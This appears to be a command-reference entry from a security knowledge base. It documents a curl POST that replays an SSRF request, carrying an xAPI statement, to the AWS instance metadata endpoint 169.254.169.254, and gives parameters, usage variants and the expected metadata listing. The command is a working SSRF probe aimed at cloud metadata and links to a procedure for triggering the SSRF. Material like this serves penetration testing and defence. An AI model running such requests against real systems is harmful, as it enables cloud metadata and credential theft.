---
data: >-
  curl -X POST "http://169.254.169.254/latest/meta-data?/statements" -H
  "X-Experience-API-Version: 1.0.3" -H "Authorization: Basic dGVzdDp0ZXN0" -H
  "Host: 169.254.169.254" -H "Accept: application/json" -H "Content-Type:
  application/json" -d '{"actor":{"objectType":"Agent","name":"xAPI
  mbox","mbox":"mailto:████"},"verb":{"id":"http://███","display":{"en-GB":"attended","en-US":"attended"}},"object":{"objectType":"Activity","id":"http://www.example.com/meetings/occurances/34534"},"id":"3b9e4565-07ac-475f-be1f-d5f590f40779"}'
tags:
  - ssrf
  - xapi
  - metadata
type: command
output: >-
  HTTP/1.0 200 OK with content listing AWS metadata paths like ami-id,
  instance-id, etc. (text/plain, 326 bytes)
executor: bash
platforms:
  - Linux
  - AWS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:10.033Z'
id: 3d8761d8-c190-46df-8cb1-9312b9b87fab
verified: false
validated: true
submitted: true
---
# curl-post-xapi-to-metadata

## Command

```bash
curl -X POST "http://169.254.169.254/latest/meta-data?/statements" \
  -H "X-Experience-API-Version: 1.0.3" \
  -H "Authorization: Basic dGVzdDp0ZXN0" \
  -H "Host: 169.254.169.254" \
  -H "Accept: application/json" \
  -H "Content-Type: application/json" \
  -d '{"actor":{"objectType":"Agent","name":"xAPI mbox","mbox":"mailto:████"},"verb":{"id":"http://███","display":{"en-GB":"attended","en-US":"attended"}},"object":{"objectType":"Activity","id":"http://www.example.com/meetings/occurances/34534"},"id":"3b9e4565-07ac-475f-be1f-d5f590f40779"}'
```

## Description

This curl command simulates the POST request sent via SSRF to the AWS metadata endpoint with an xAPI statement payload, useful for testing or replicating the forged server request in local AWS environments.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| URL | Target metadata path with ?/statements | Yes |
| `-H "X-Experience-API-Version: 1.0.3"` | xAPI version header | Yes |
| `-H "Authorization: Basic dGVzdDp0ZXN0"` | Base64-encoded Basic Auth ('test:test') | Yes |
| `-H "Host: 169.254.169.254"` | Forces host header for metadata service | Yes |
| `-H "Accept: application/json"` | Expected response format | Yes |
| `-H "Content-Type: application/json"` | Request body format | Yes |
| `-d '{JSON}'` | xAPI statement body with actor, verb, object, ID | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "http://169.254.169.254/latest/meta-data?/statements" -H "X-Experience-API-Version: 1.0.3" -H "Authorization: Basic dGVzdDp0ZXN0" -d '{...}'
```

### Advanced Usage

Add `--connect-timeout 5` for quick failure on non-AWS hosts:

```bash
curl -X POST "http://169.254.169.254/latest/meta-data?/statements" --connect-timeout 5 -H "..." -d '{...}'
```

## Expected Output

HTTP/1.0 200 OK
Content-Type: text/plain

ami-id
instance-action
...

(Directory listing of metadata paths, approximately 326 bytes)

## Related

- [[commands/curl-get-xapi-from-metadata]]
- [[procedures/Test-LRS-Configuration-to-Trigger-SSRF]]
